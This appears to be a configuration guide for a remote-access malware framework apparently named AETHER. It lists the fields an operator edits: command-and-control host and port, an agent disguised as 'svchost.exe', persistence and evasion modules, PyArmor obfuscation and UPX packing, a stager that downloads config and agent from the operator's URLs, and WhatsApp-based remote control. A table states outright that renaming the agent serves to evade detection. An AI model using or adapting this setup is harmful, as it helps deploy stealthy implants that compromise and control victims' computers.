**What to change**:
```json

  "c2_host": "c2.example.com",              // ‚Üê CHANGE THIS
  "c2_port": 443,                           // ‚Üê Can change if needed
  "encryption_key": "CHANGE_THIS_...",      // ‚Üê Auto-generated by setup
  
  "c2": {
    "primary_host": "c2.example.com",       // ‚Üê CHANGE THIS
    "primary_port": 443                     // ‚Üê Can change if needed
  },
  
  "agent": {
    "name": "svchost",                      // ‚Üê Change to different process
    "persistence_methods": [...]            // ‚Üê Enable/disable
    "modules": {...}                        // ‚Üê Enable/disable
    "evasion": {...}                        // ‚Üê Enable/disable
  },
  
  "builder": {
    "output_name": "svchost.exe",          // ‚Üê Change executable name
    "use_pyarmor": true,                    // ‚Üê Obfuscation toggle
    "use_upx": true                         // ‚Üê Compression toggle
  },
  
  "stager": {
    "config_url": "https://...",           // ‚Üê CHANGE THIS (your URLs)
    "agent_url": "https://..."              // ‚Üê CHANGE THIS (your URLs)
  },
```

## ‚ö†Ô∏è CRITICAL VALUES THAT MUST CHANGE

| Field | File | Current Value | What to Change To | Why |
|-------|------|--------------|-------------------|-----|
| `encryption_key` | config.json | CHANGE_THIS_TO_... | Random 64 chars | Secures communications |
| `c2_host` | config.json | localhost | Your C2 domain | Agents know where to connect |
| `c2_port` | config.json | 443 | Your port | Agents know which port |
| `agent.name` | config.json | svchost | Different name? | Evade detection |
| `builder.output_name` | config.json | svchost.exe | Different name? | Evade detection |
| `stager.config_url` | config.json | None | Your C2 URL | Stager downloads config |
| `stager.agent_url` | config.json | None | Your C2 URL | Stager downloads agent |
| `whatsapp.auth_password` | config.json | aether2025 | Strong password! | Prevent unauthorized access |
| `whatsapp.authorized_users` | config.json | Empty array | Your number | Allow WhatsApp control |

**Use AETHER_SETUP.py to fill these in interactively!**
